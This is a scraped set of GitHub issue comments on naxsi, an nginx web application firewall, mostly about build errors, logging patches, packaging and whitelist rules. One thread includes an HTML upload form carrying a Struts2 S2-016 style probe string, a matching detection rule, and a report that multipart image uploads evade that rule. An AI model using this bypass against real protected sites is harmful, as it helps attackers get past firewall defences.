on GitHub\nhttps://github.com/nbs-system/naxsi/issues/140#issuecomment-63435119.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/140#issuecomment-63448591.\n. ok.\n\nwill not have time soon, but I will check that\nOn Mon, Feb 16, 2015 at 8:40 PM, buixor notifications@github.com wrote:\n\nHi,\nPlease see issue 162, we are going to pull @nzin https://github.com/nzin\npatch.\nClosing this one, please follow up on issue 162.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/161#issuecomment-74536543.\n. Thanks for the feedback.\n\nI updated my sources accordingly.\nRegards,\nNicolas\nOn Tue, Oct 7, 2014 at 7:47 AM, blotus notifications@github.com wrote:\n\nIn naxsi_src/naxsi_skeleton.c:\n\n@@ -149,6 +156,35 @@ static ngx_command_t  ngx_http_dummy_commands[] =  {\n     NGX_HTTP_LOC_CONF_OFFSET,\n     0,\n     NULL },\n-  /* NaxsiLogfile */\n-  { ngx_string(TOP_NAXSI_LOGFILE_T),\n-    NGX_HTTP_MAIN_CONF|NGX_CONF_1MORE,\n\nReplace NGX_CONF_1MORE with NGX_CONF_TAKE1 as only the first argument is\nused ?\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/pull/100/files#r18513358.\n. \n",
    "binaryanomaly": "I would really love to see that feature as part of naxsi. Good job!\n. I could actually test it a bit.\nCloned https://github.com/nzin/naxsi and tried to build it together with nginx which ends up in an error?\ncc -c -pipe  -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -D_FORTIFY_SOURCE=2  -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs -I src/http -I src/http/modules -I src/mail \\\n        -o objs/addon/naxsi_src/naxsi_skeleton.o \\\n        /opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_skeleton.c\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_skeleton.c:58:15: error: \u2018ngx_http_naxsi_logfile_main_conf\u2019 used but never defined [-Werror]\n static char  ngx_http_naxsi_logfile_main_conf(ngx_conf_t cf,\n               ^\ncc1: all warnings being treated as errors\nmake[1]: * [objs/addon/naxsi_src/naxsi_skeleton.o] Error 1\nmake[1]: Leaving directory `/opt/nginx-1.5.12'\nmake: *** [build] Error 2\n. It builds and runs. Seems to still log to error.log though. Anything I need to configure?\n. Ok I changed the config and it did work during my intial tests :)\n3 hours later now naxsi is not logging anything anymore to my naxsi.log or error.log (I see that naxsi still fires in the access.log though as there are 403s for strings covered by naxsi rules)\nRestarting the nginx service fixed it, so I assume something is not quite right yet?\n. There was no logrotate, how would I check for the latter?\n. ok I see.\nI have it in location. The malware bots seem to be lazy today so not much traffic besides my own faked attempts ;)\n. Happened again. Does this help:\nnginx     21111             root   12w      REG              253,0     3516     408635 /var/log/nginx/naxsi.log\nnginx     21113         www-data   12w      REG              253,0     3516     408635 /var/log/nginx/naxsi.log\nnginx     21114         www-data   12w      REG              253,0     3516     408635 /var/log/nginx/naxsi.log\nnginx     21115         www-data   12w      REG              253,0     3516     408635 /var/log/nginx/naxsi.log\nnginx     21116         www-data   12w      REG              253,0     3516     408635 /var/log/nginx/naxsi.log\nroot     21111  0.0  0.2  44520  1348 ?        Ss   15:56   0:00 nginx: master process /usr/sbin/nginx\nwww-data 21113  0.0  0.6  44664  3476 ?        S    15:56   0:00  _ nginx: worker process\nwww-data 21114  0.0  0.7  45180  3996 ?        S    15:56   0:01  _ nginx: worker process\nwww-data 21115  0.0  0.7  45212  3744 ?        S    15:56   0:01  _ nginx: worker process\nwww-data 21116  0.0  0.6  44520  3228 ?        S    15:56   0:00  _ nginx: worker process\n. Ok glad to hear. Let me know once you have a version on github that is worth testing again.\n. Well I can't make it work anymore since the last update?\nWhen I define naxsi_log /var/log/nginx/naxsi.log in http or location it just doesn't log anything\nAlso nothing in the error.log just doesn't log naxsi actions at all. Naxsi works as it's blocking access and I can see that in access.log. Any ideas?\n. Hey Nicolas, can't find the attachment?\n. ok got the base64 stuff :) now I get a build error:\ncc -c -pipe  -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -D_FORTIFY_SOURCE=2  -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs -I src/http -I src/http/modules -I src/mail \\\n        -o objs/addon/naxsi_src/naxsi_json.o \\\n        /opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_json.c\ncc -c -pipe  -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -D_FORTIFY_SOURCE=2  -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs -I src/http -I src/http/modules -I src/mail \\\n        -o objs/addon/naxsi_src/naxsi_log.o \\\n        /opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c: In function \u2018naxsi_http_log_handler\u2019:\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:247:7: error: pointer targets in passing argument 1 of \u2018ndebug\u2019 differ in signedness [-Werror=pointer-sign]\n       ndebug(str[i].data);\n       ^\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:40:6: note: expected \u2018const char _\u2019 but argument is of type \u2018u_char \u2019\n void ndebug(const char str) {\n      ^\ncc1: all warnings being treated as errors\nmake[1]: _* [objs/addon/naxsi_src/naxsi_log.o] Error 1\nmake[1]: Leaving directory `/opt/nginx-1.5.12'\nmake: ** [build] Error 2\n. Next error, guess I'm really the wrong guy to fiddle with C code, sry ;)\ncc -c -pipe  -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -D_FORTIFY_SOURCE=2  -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs -I src/http -I src/http/modules -I src/mail \\\n        -o objs/addon/naxsi_src/naxsi_log.o \\\n        /opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:40:13: error: expected declaration specifiers or \u2018...\u2019 before \u2018(\u2019 token\n void ndebug((const char _)str[i].data) {\n             ^\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c: In function \u2018ngx_http_naxsi_logfile_loc_conf\u2019:\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:131:5: error: implicit declaration of function \u2018ndebug\u2019 [-Werror=implicit-function-declaration]\n     ndebug(\"ngx_http_naxsi_logfile_loc_conf(): not able to open log file\\n\");\n     ^\ncc1: all warnings being treated as errors\nmake[1]: _* [objs/addon/naxsi_src/naxsi_log.o] Error 1\nmake[1]: Leaving directory `/opt/nginx-1.5.12'\nmake: ** [build] Error 2\n. Told you ;) thanks that worked.\nNow I have the same situation as before, naxsi rule fires, no log entry in naxsi.log\n/tmp/debug looks like this:\nnaxsi_http_log_handler()\nngx_log_naxsi()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\n. Hey Nicolas\nThanks for the update. Sorry but I got an error again ;)\ncc -c -pipe \u00a0-O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -D_FORTIFY_SOURCE=2 \u00a0-I src/core -I src/event -I src/event/modules -I src/os/unix -I objs -I src/http -I src/http/modules -I src/mail \\\n        -o objs/addon/naxsi_src/naxsi_log.o \\\n        /opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c: In function \u2018ngx_log_naxsi\u2019:\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:320:19: error: comparison between signed and unsigned integer expressions [-Werror=sign-compare]\n\u00a0 \u00a0 \u00a0for (l = 0; l < logarray->nelts; l++) {\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0^\ncc1: all warnings being treated as errors\nmake[1]: * [objs/addon/naxsi_src/naxsi_log.o] Error 1\nmake[1]: Leaving directory `/opt/nginx-1.5.12'\nmake: * [build] Error 2\nrgds\n--\u00a0\nReto\nFrom:\u00a0Nicolas Zin notifications@github.com\nReply:\u00a0nbs-system/naxsi reply@reply.github.com\nDate:\u00a02. April 2014 at 23:22:27\nTo:\u00a0nbs-system/naxsi naxsi@noreply.github.com\nCc:\u00a0binaryanomaly reto.haeberli@comnode.net\nSubject:\u00a0 Re: [naxsi] redirect naxsi log to a separate log file (#100)  \nHi Reto,\ncan you try the new code I pushed on github. There are no debug log (in\n/tmp/debug).\nI'm testing it on my employer company, and it is stable. (and should\ncompile without issues :-) )\nRegards,\nNicolas\nOn Tue, Apr 1, 2014 at 2:57 PM, Nicolas Zin nicolas.zin@gmail.com wrote:\n\nOk, let's run it for some hours and send me back the 2 files (/tmp/debug\nand logs). except if the logs are totaly empty => just the /tmp/debug. :-)\nand I will supply a new naxsi_log if I don't manage to find the problem :-(\nOn Tue, Apr 1, 2014 at 2:35 PM, binaryanomaly notifications@github.comwrote:\n\nTold you ;) thanks that worked.\nNow I have the same situation as before, naxsi rule fires, no log entry\nin naxsi.log\n/tmp/debug looks like this:\nnaxsi_http_log_handler()\nngx_log_naxsi()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\nnaxsi_http_log_handler()\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39241711\n.\n\n\u2014\nReply to this email directly or view it on GitHub.\n. Great, it builds, it runs and it logs for now ;)\n. Yes, everything's fine over here! :)\n\nrgds\n--\u00a0\nReto\nFrom:\u00a0Nicolas Zin notifications@github.com\nReply:\u00a0nbs-system/naxsi reply@reply.github.com\nDate:\u00a05. April 2014 at 20:17:37\nTo:\u00a0nbs-system/naxsi naxsi@noreply.github.com\nCc:\u00a0binaryanomaly\nSubject:\u00a0 Re: [naxsi] redirect naxsi log to a separate log file (#100)  \nHi Reto,\nis it still working fine?\nOn my side, things are going smoothly: still logging, logrotate working\nfine (and nx_util working fine on the logs)\nRegards,\nNicolas\n. running it here since 5 days in a row, everything smooth so far...\n. I think I had it running on v1.7.1 for a short time. But then switched back to the official tree because I had to reinstall nginx for other reasons. Didn't encounter any problems afaik. Someone should double check and then it would be about time for a merge, finally :)\n. congrats ;)\n. Thanks, you're right, I found the culprit:\nI used the following for browser caching in a sub-config file\nlocation ~*  .(jpg|jpeg|png|gif|ico|css|js)$ {\n    expires 7d;\n}\nwhich obviously triggered a 404. Enabled naxsi there now as well and it fires :)\nthx!\n. ok, done\n. See discussion here:\nhttps://groups.google.com/forum/#!topic/naxsi-discuss/zvWePbjIT2A\n. ",
    "ruoshan": "it's on the line 395. sorry for the typo.\n. ",
    "jakoch": "Over at Googlecode \nGNU/GPL v2+\nhttp://code.google.com/p/naxsi/source/browse/trunk/COPYING\n. ",
    "infinitnet": "Yes, only \"Home\" is blank - every subpage works correctly.\n. ",
    "Veallym0n": "try:\n<form action=\"URLonNaxsi\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"file\" name=\"f\">\n    <input name=\"hello\" value=\"redirect:aaaa.java.lang.pc.syssec_test\">\n    <input type='submit'>\n</form>\n. My rule is\n```\nMainRule \"rx:(action|redirect|redirectAction):.*java.lang\" \"msg:Java struts2 S2-016/S2-017\" \"mz:ARGS|URL|BODY\" \"s:$EVADE:4\" id:1820;\nCheckRule \"$EVADE >= 4\" BLOCK;\n```\n. I tried someothers and I found if you upload an Image, Naxsi will pass the rule, if you upload some textfile or something with plaintext, it will be block. \nI've try to upload a txt file and change the content-type from text/plain to image/jpeg, it still will going block. seems not work with content-type.\nweird. \ncould you try upload some images with my example?\n. in my rule:\nBasicRule wl:2 \"mz:BODY\";\nnow I create a 50k txt file and upload it with my example, rule passed means about BasicRule 2 ?\nI read the code about rule 2,  \nif (r->headers_in.content_length_n != full_body_len) {\n    ngx_http_apply_rulematch_v_n(&nx_int__big_request, ctx, r, NULL, NULL, BODY, 1, 0);\n    /* if (ngx_http_dummy_is_rule_whitelisted_n(r, cf, &nx_int__weird_request, NULL, BODY, 0) == 0) */\n    /*   ctx->weird_request = 1; */\n    return ;\n  }\nit going compare with the content-length and cachefile length\uff0cI do not sure how it will going different in my example. (I use chrome)\n. ",
    "itpp16": "nginx version, compile order and a sample config in https://groups.google.com/forum/#!forum/naxsi-discuss would be nice to test and find out whats going on.\n. For example the c++ compiler can't find the .h file without it.\n. replaced by 146\n. replaced by 146\n. replaced by 146\n. See if this works for you: https://github.com/nbs-system/naxsi/pull/117\n. google bot does not request .. this must be a fake client id.\n. It is a crawler, crawl-66-249-78-40.googlebot.com\nbut anyway, any match against naxsi rules must work, it doesn't matter who initiates it.\n. Windows of course.\n. I have tried but not been able to figure out how to fix this, the one who wrote it must know whats going on, it should produce the same faults on linux.\n. The 3 errors are at the top of this issue. Tnx for looking.\n. Tnx, I will have a look today and let you know.\n. Still the same;\n/naxsi_runtime.c(964) : warning C4057: 'function' : 'va_list' differs in indirection to slightly different base types from 'u_char *'\n/naxsi_utils.c(866) : warning C4133: 'function' : incompatible types - from 'ngx_str_t *' to 'va_list'\n/naxsi_utils.c(866) : warning C4020: 'ngx_log_naxsi' : too many actual parameters\nWhich version did you try to fix? not the one here as none of the latest 'VARIADIC_MACROS' are in there.\n. I've sent you en email with full sources.\n. Ok, Nicolas sorted out a solution which compiles, just left with an issue where 'stat' is a unix only function, looking for a replacement. Hopefully Nicolas will commit the naxsi.h changes, if not let me know and I'll place the commit/pull.\n. Solved by Nicolas, I also committed a huge amount of changes to make code c++ compliant between linux and windows, see https://github.com/nbs-system/naxsi/pull/146 with no functional changes. Ignore my older pulls.\n. buixor & nzin, can you have a look at the latest 146 pull ?\n. I've send you the sources again, maybe I've missed something in the github upload, but the debugXX are per nginx default style. (ea.: \\src\\core\\ngx_log.h, or \\src\\core\\ngx_cycle.c)\n. Ok, in naxsi_runtime.c this needs to be changed after pull 146;\nifdef _MSC_VER\ndefine dummy_error_fatal(ctx, r, ...) do {             \\\nif (ctx) ctx->block = 1;                        \\\nngx_log_debug0(NGX_LOG_DEBUG_HTTP, r->connection->log, 0,  \\\n      \"XX-*******\\* NGINX NAXSI INTERNAL ERROR ********\");   \\\nngx_log_debug0(NGX_LOG_DEBUG_HTTP, r->connection->log, 0, __VA_ARGS__); \\\nngx_log_debug3(NGX_LOG_DEBUG_HTTP, r->connection->log, 0, \\\n      \"XX-func:%s file:%s line:%d\", \\\n      **func**, **FILE**, **LINE**);            \\\nif (r && r->uri.data) ngx_log_debug1(NGX_LOG_DEBUG_HTTP, \\\n                r->connection->log, 0, \\\n                \"XX-uri:%s\", r->uri.data);  \\\n\n} while (0)\nelse\ndefine dummy_error_fatal(ctx, r, ...) do {             \\\nif (ctx) ctx->block = 1;                        \\\nngx_log_debug(NGX_LOG_DEBUG_HTTP, r->connection->log, 0,  \\\n      \"XX-*******\\* NGINX NAXSI INTERNAL ERROR ********\");   \\\nngx_log_debug(NGX_LOG_DEBUG_HTTP, r->connection->log, 0, **VA_ARGS**); \\\nngx_log_debug(NGX_LOG_DEBUG_HTTP, r->connection->log, 0, \\\n      \"XX-func:%s file:%s line:%d\", \\\n      **func**, **FILE**, **LINE**);            \\\nif (r && r->uri.data) ngx_log_debug(NGX_LOG_DEBUG_HTTP, \\\n                r->connection->log, 0, \\\n                \"XX-uri:%s\", r->uri.data);  \\\n\n} while (0)\nendif\nThen it works/compiles for both OS's.\nps. Hmm, code is not formatted, I can push this pull after 146 is imported.\n. buixor, did you have time to have a look at the latest 146 pull ? I've added pull 147 to fix the dummy_error issue.\n. Alice in wonderland here :) what else would you like to know? undeclared identifiers can be easily solved but;\ntypedef struct\n{\n  ngx_array_t   special_scores;\n............\n  ngx_http_special_score_t libjct_sql = ngx_array_push(nx_int__libinject_sql->sscores);\n  ngx_http_special_score_t *libjct_xss = ngx_array_push(nx_int__libinject_xss->sscores);\nNot that easily.\n. Initially those lines should not occur in the middle of code, moved them to the top of function.\nFixed the rest but it crashes hard, could be the while (TRUE / 1) items (which is really bad coding)...\n. ",
    "Annihil": "Confirmed\nWith the latest source (Naxsi 0.54 / commit: f3e42f2a408e7606e98e7535c1b0a8b2731c397e)\ncurl http://localhost -d \"cookie=\\\"123\"\ntail -f /var/log/nginx/error.log\n\n2016/03/20 01:58:01 [error] 17455#17455: *1 NAXSI_FMT: ip=127.0.0.1&server=localhost&uri=/&learning=1&vers=0.54&total_processed=1&total_blocked=1&block=1&cscore0=$SQL&score0=16&cscore1=$XSS&score1=16&zone0=BODY&id0=1001&var_name0=cookie&zone1=BODY&id1=1001&var_name1=cookie, client: 127.0.0.1, server: _, request: \"POST / HTTP/1.1\", host: \"localhost\"\n\nThere are two problems here:\n- the variable cookie, here, is a BODY var, so it should not match with $HEADERS_VAR:Cookie\n- there are two matches, but there should only be one\n. \\b(select|union|update|delete|insert|table|from|ascii|hex|unhex|drop)\\b\nworks better for me,\nit matches select+from but not selected+fromage,\nwhich is what we want I think :smiley:. ",
    "markusbeck-owncloud": "Really?\nThe IP 66.249.78.40 has just been banned by Fail2Ban after\n1 attempts against nginx-naxsi.\nNetRange:       66.249.64.0 - 66.249.95.255\nCIDR:           66.249.64.0/19\nOriginAS:\nNetName:        GOOGLE\nNetHandle:      NET-66-249-64-0-1\nParent:         NET-66-0-0-0-0\nNetType:        Direct Allocation\nRegDate:        2004-03-05\nUpdated:        2012-02-24\nRef:            http://whois.arin.net/rest/net/NET-66-249-64-0-1\nLines containing IP:66.249.78.40 in /var/log/nginx/error.log\n2014/05/17 06:50:15 [error] 12563#0: *38562 NAXSI_FMT: ip=66.249.78.40&server=www.server.de&uri=/ip..&total_processed=7009&total_blocked=2&zone0=URL&id0=1200&var_name0=, client: 66.249.78.40, server: www.server.de, request: \"GET /ip.. HTTP/1.1\", host: \"www.server.de\"\nMaybe you're right @itpp16 \nI was checking IP netblocks manually (https://support.google.com/a/answer/60764?hl=en) and google uses\nip4:216.239.32.0/19 \nip4:64.233.160.0/19 \nip4:66.249.80.0/20 \nip4:72.14.192.0/18 \nip4:209.85.128.0/17 \nip4:66.102.0.0/20 \nip4:74.125.0.0/16 \nip4:64.18.0.0/20 \nip4:207.126.144.0/20 \nip4:173.194.0.0/16\nInteresting is the third block that starts from 66.249.80.0 and NOT 66.249.64.0 like above. But some people say, that the address block starts with 66.249.64.0... Anyway. It seems the requests comes from google bot. So any ideas?\n. ",
    "chaZz-c": "modification vis-a-vis de la syntaxe de l'option --filter dans le README de nxtool\n. Deleted an exit() call and add a try-except to prevent NameError to occur:\nhttps://github.com/nbs-system/naxsi/pull/209\n. Yep, everything works fine with the fix :)\n. ",
    "guiguiabloc": "add nxapi.json configuration for syslog host and port\n. :)\nWorks fine in tcp mode :\nsyslog.conf:\nfilter f_naxsi { match(\"NAXSI_FMT\" value(\"MESSAGE\")); };\nsource mywebsite {\nfile(\"/var/log/nginx/logs/mywebsite-error.log\" flags(no-parse));\n};\ndestination nxtool {\n        tcp(\"10.1.2.3\" port(51401) template(\"$MSG\\n\"));\n};\nlog { source(mywebsite); filter(f_naxsi); destination(nxtool); };\nnxapi.json\n},\n\"syslogd\": {\n \"host\" : \"0.0.0.0\",\n \"port\" : \"51401\"\n},\npython nxtool.py -c nxapi.json --syslog \nCould you try it ?\n. Confirmed. Unwanted change\n. Confirmed. Unwanted change\n. Confirmed. Unwanted change\n. Yep, it will better. Trying to add it\n. ",
    "Napsty": "Hi blotus\nThanks for your quick answer! \nThat's what I did and meant with \"I have activated NAXSI in nginx.conf\":\n```\n    ##\n    # nginx-naxsi config\n    ##\n    # Uncomment it if you installed nginx-naxsi\n    ##\ninclude /etc/nginx/naxsi_core.rules;\n\n```\nSo these are active.\n. It seems we have solved the issue. In your wiki (https://github.com/nbs-system/naxsi/wiki/installation) you mention the compile order of the modules. When you install NAXSI on Debian trough apt, then nginx is compiled with naxsi at the end.  We have manually recompiled from the nginx sources with naxsi at the begin and now the same site works perfectly fine with NAXSI enabled.\nI will therefore close this issue and open a Debian bug. \n. I feel stupid now... \nI forgot to remove the original --add-module for naxsi from the debian/rules at the bottom of the configure command (see above). All good, package was built.\n. ",
    "jmce": "At least in this context \nhttps://github.com/gplessis/dotdeb-nginx/issues/79\nI still get blocking for internal rules 17 and 18, both involving libinjection.\nIs there a way to get the expected behavior for those two rules, in  learning mode?\n. Huh, I suppose I can simply set the corresponding CheckRule settings ($LIBINJECTION_SQL, $LIBINJECTION_XSS) to LOG instead of DROP  :) --- by the way, I noticed only now that those are the only cases for which I had DROP instead of BLOCK (using default suggested settings), thus now wondering if that might explain the difference in behavior (learning mode suppressing BLOCK but not DROP?).\n. A similar issue for BODY args was mentioned here https://github.com/nbs-system/naxsi/issues/110 but at least in what's included in dotdeb's nginx-naxsi & nginx-extras [1.8.1-1~dotdeb+8.1],\napparently [per naxsi.h] version 0.54, EXLOG output still has var_name and content swapped when zone=ARGS|NAME or BODY|NAME. \nE.g.,  a URL with a query including   \"\u2026&updated=true&\u2026\" results in \nvar_name=true and content=updated info in EXLOG output lines.\n. ",
    "Cosmo439": "I have also had the same problem using 0.53-2.  I have only tried compiling from source.\n. ",
    "rogerthat": "https://github.com/nbs-system/naxsi/wiki/whitelists\nthere are regex-whitelist-examples at the end\n. https://github.com/nbs-system/naxsi/wiki/nxutil\n. you should download 0.53-2 from \nhttps://github.com/nbs-system/naxsi/releases\niirc nx_util.py is still included there\n. yip, i know, but this solution is more a workaround than a feature :) \n. nevermind, it's not an issue but a problem with multiple attacks within one request\n. a colleague of mine works on a http-fuzzer, so expect more to come :D \n. great stuff\n. Hi,\nexactly, that would be perfetct\ni could and would test this under live-conditions\n. ",
    "plllp": "thanks you reply!  I hava another question. Could you tell me,the nxutil  was remove with  newest nbs-system repo? I can't find it!\n. o yeah!! I get it.  thank you very mach~~~~~ hhhhhhhh\n. ",
    "craiglawson": "mistake on my behalf, updated in pull request 141\n. Hi there,\nI think we have see this issue before: the issue is with nginx, more precisely here: \"define NGX_MAX_ERROR_STR   2048\"\nWe have patched this issue as follows:\nmax_error_str.patch.txt\nThis needs to be done when nginx compiles and can't be retrospectively modified\nAlso, to help yourself out you could use the Wordpress rules found here: https://github.com/nbs-system/naxsi-rules/blob/master/wordpress.rules\nC. ",
    "streaml1ne555": "I can try this. Would this rule then bypass any other checks associated with the foobarbaz content? If for instance if had some regex to allow a 40 character string could that string then contain sql inject code and not be detected by other rules if I use a negative rule to validate?\n. ",
    "MisterM74": "We say no, because I'm trying to understand how the configuration and functionality especially between NXAPI and especially nxapi.json place or file, even if it is installed and I /usr/local/etc/nxapi.json repndre do not know how my information and the logs displayed in Kibana\nThank you for your help\nM\n. ",
    "StefanCG": "Hey guys,\nI've just setup ES according to the readme and in fact I'm able to push data towards ES with nxtool.\nBut when running \nnxtool.py -c nxapi.json -x\nI get the same error the OP reported above. And in my case the data is obviously being stored in teh index.\ncurl -XPOST \"http://127.0.0.1:9200/nxapi/events/_search?pretty\" -d '{}'                \n{\n  \"took\" : 4,\n  \"timed_out\" : false,\n  \"_shards\" : {\n    \"total\" : 5,\n    \"successful\" : 5,\n    \"failed\" : 0\n  },\n  \"hits\" : {\n    \"total\" : 158,\n    \"max_score\" : 1.0,\n    \"hits\" : [ {\n      \"_index\" : \"nxapi\",\n      \"_type\" : \"events\",\n      \"_id\" : \"AC3IzdshFCDWPC0DWib1\",\n      \"_score\" : 1.0,\n      \"_source\":{}\n    }, {\n      \"_index\" : \"nxapi\",\n      \"_type\" : \"events\",\n...\nCan you please advise? I'm not a python guy as all so I'm somewhat lost as I just want to create a really tiny whitelist ...\nPS: I'm using the most recent version (just cloned from git)\n. ",
    "Magalex2x14": "I would like to confirm the problem:\n```\n~# apt-get install nginx-naxsi\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nSome packages could not be installed. This may mean that you have\nrequested an impossible situation or if you are using the unstable\ndistribution that some required packages have not yet been created\nor been moved out of Incoming.\nThe following information may help to resolve the situation:\nThe following packages have unmet dependencies:\n nginx-naxsi : Depends: nginx-common (= 1.6.2-1+trusty0) but 1.6.2-4+trusty0 is to be installed\n               Conflicts: nginx-light but 1.6.2-4+trusty0 is to be installed\nE: Unable to correct problems, you have held broken packages.\n```\n. ",
    "jharbott": "Debian has stopped packaging nginx with naxsi, see https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=746199\n. ",
    "khaefeli": "Bad news. \n@blotus @buixor Is it maybe planned to maintain an own repo?\n. Hi buixor,\nthank you for your answer! OK, I understand. Probably most of the people will react, when Jessie is released.\n(Bad for us, because we're planning right now our next gen hosting with Debian Jessie and the WAF part is one of the most important.)\nAnyway. I've reported it as a bug for the nginx Debian Jessie package. Maybe it helps to clarify the situation. No supported nginx WAF can't be an option.\nhttps://bugs.debian.org/cgi-bin/bugreport.cgi?bug=773301\n. Hi Buixor,\nThank you for your answer!\nI've compiled the newest version of your great  naxsi now, to avoid the PRCE output vector bug.\nBut the issue is still there. I tried to \"breakdown\" the problem, but It's really wired:\nBasicRule wl:1310,1311 \"mz:$URL:/admin|$BODY_VAR:login[password]|NAME\";\nBasicRule wl:1310,1311 \"mz:$URL:/admin|$BODY_VAR:login[username]|NAME\";\nBasicRule wl:1310,1311 \"mz:$URL:/admin/|$BODY_VAR:login[password]|NAME\";\nBasicRule wl:1310,1311 \"mz:$URL:/admin/|$BODY_VAR:login[username]|NAME\";\nWhen I use this  four rules, I can login into the magento backend and everything is fine.\nBut when I comment them out and insert:\nBasicRule wl:1310,1311 \"mz:$URL:/admin|BODY\";\nto whitelist  the post request, the login POST is blocked with the following log entry:\n2015/03/03 09:49:27 [error] 9810#0: *47 NAXSI_FMT: ip=91.199.98.29&server=www.domain.ch&uri=/admin&learning=0&vers=0.53-1&total_processed=2&total_blocked=1&block=1&cscore0=$XSS&score0=8&zone0=BODY|NAME&id0=1310&var_name0=login[username]&zone1=BODY|NAME&id1=1311&var_name1=login[username], client: 91.199.98.29, server: www.domain.ch, request: \"POST /admin HTTP/1.1\", host: \"www.domain.ch\", referrer: \"http://www.domain.ch/admin\"\nalso the regex whitelists above aren't working. But maybe it's the same issue, that |BODY or |ARGS aren't working correct?\nWe're using Debien Jessie with Nginx 1.6.2 and libpcre3:amd64 2:8.35-3.3\nRegards,\nKevin\n. (facepalm) thank you. works\n. cool, thanks! \n. @hugochinchilla I think I got the same issue here:\nhttps://github.com/nbs-system/naxsi/issues/182\n. Hi @buixor \nfirst: thank you again for the fast answer.\nI also don't use windows, so I've to ask some colleagues :-) Anyway:\nI don't see any boundery line in my IE11 post (see pastbin). \nbut I'll recheck the error.log with log level debug. \nedit: ok I see now.\n2015/04/15 17:13:06 [debug] 14477#0: *2474 XX-******** NGINX NAXSI INTERNAL ERROR ********\n2015/04/15 17:13:06 [debug] 14477#0: *2474 POST data : no 'name' in POST var\n2015/04/15 17:13:06 [debug] 14477#0: *2474 XX-func:ngx_http_dummy_multipart_parse file:/tmp/naxsi/naxsi_src//naxsi_runtime.c line:1710\nrelated to: https://github.com/nbs-system/naxsi/blob/master/naxsi_src/naxsi_runtime.c#L1735\nis it maybe related to this POST data:\nContent-Disposition: form-data; name=\\x22\\x22\\x0D\\x0A\\x0D\\x0ASenden\\x0D\\x0A-----------------------------7df2313480796\\x0D\\x0A\ncheers\n. Hi!\nThe application works like expected when we put naxsi in the learning mode. \nAt the moment I also don't see any logs anymore regarding this issue. \nAlso my IE11 test ist OK. Maybe it was an IE bug, which is fixed now. \nYou can close this issue - I'll keep an eye on it and come back to you if we see this strange behaviour again. (with some full body logs..)\nThanks!\n. Hi,\nOK, now we got it. \nThe issue is related to IE11 and the fact that IE11 submits the form with the submit button part in the POST (even if the name is empty)\n See:\nContent-Disposition: form-data; name=\\x22\\x22\\x0D\\x0A\\x0D\\x0Asenden\\x0D\\x0A-----------------------------7df379324004a\\x0D\\x0A\nrequest body for that was:\n```\n-----------------------------7df2a3322007a\nContent-Disposition: form-data; name=\"\"\nsenden\n-----------------------------7df2a3322007a\n```\nThe installed TYPO3 extension (powermail) added a submit button with an empty name=\"\"\nchrome, firefox and other browser simply submit the post without the \"submit\" part. \nso the post is valid. IE11 doesn't.\nso we fixed it with adding something like:\n<input type=\"submit\" name=\"thankyouIE11\" value=\"Senden\">\ncheers\n. no worries! we can repeat the rules - that should be a real problem (but it would be nicer with such a regex) maybe the WL regex wiki section should be updated to \"warn\" other people \n. tricky one :-)\nbut escaping for example [ is working?\nBasicRule wl:1310,1311 \"mz:$BODY_VAR_X:^tx_(.*)\\[(.*)|NAME\";\n. ",
    "shellshocker": "Vote for Debian Jessie public repo. :-)\nJust wanted to install it and then BAM! - not supported anymore. I don't want to use nginx without my beloved naxsi!\n. ",
    "efkan": "Compiling Nginx with Naxsi on Ubuntu 14.04 LTS;\nhttps://blog.stickleback.dk/compiling-nginx-with-naxsi-on-ubuntu-14-04-lts/\nFor now, if you want to install a former nginx-naxsi version;\nfirst, clear old nginx installations..\nthen sudo apt-get install nginx-common=1.6.2-1+trusty0\nthen sudo apt-get install nginx-naxsi=1.6.2-1+trusty0\n. ",
    "trippleflux": "Will ever be a wiki for the new nxtool?\n. ",
